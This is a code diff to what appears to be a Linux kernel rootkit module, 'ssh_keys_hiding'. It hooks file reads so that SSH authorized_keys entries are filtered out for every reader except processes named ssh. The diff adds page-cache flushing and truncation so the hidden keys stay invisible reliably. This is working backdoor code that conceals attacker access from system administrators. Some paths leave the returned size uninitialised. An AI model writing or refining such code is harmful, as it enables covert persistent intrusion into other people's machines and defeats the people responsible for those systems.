@@ -4,6 +4,8 @@
 #include <linux/uaccess.h>
 #include <linux/uio.h>
 #include <linux/slab.h>
+#include <linux/pipe_fs_i.h>
+#include <linux/highmem.h>
 
 #include "ssh_keys_hiding.h"
 
@@ -25,23 +27,26 @@ void initialize_filter(char* filesystem_file_operation_name) {
     __sync_synchronize();
 }
 
-#include <linux/bvec.h>
-#include <linux/pipe_fs_i.h>
-#include <linux/highmem.h>
 
 ssize_t file_read_iter(struct kiocb *iocb, struct iov_iter *to) {
-    ssize_t size = g_original_fops.read_iter(iocb, to);
+    ssize_t size;
     char* path = NULL;
     char* buffer = kmalloc(PATH_MAX, GFP_KERNEL);
     if (NULL != buffer) {
         path = dentry_path_raw(iocb->ki_filp->f_path.dentry, buffer, PATH_MAX);
         if (!IS_ERR(path)) {
             if (NULL != strstr(path, "ssh/authorized_keys")) {
+                filemap_flush(iocb->ki_filp->f_inode->i_mapping);
+                size = g_original_fops.read_iter(iocb, to);
+                truncate_inode_pages(iocb->ki_filp->f_inode->i_mapping, 0);
                 if (NULL == strstr(current->comm, "ssh") && to->pipe->bufs->len != 0) {
                     char* buf = kmap(to->pipe->bufs->page);
                     size = (ssize_t)remove_hidden_keys(buf, to->pipe->bufs->len);
                     kunmap(to->pipe->bufs->page);
                 }
+            }
+            else {
+                size = g_original_fops.read_iter(iocb, to);
             }
         }
         kfree(buffer);
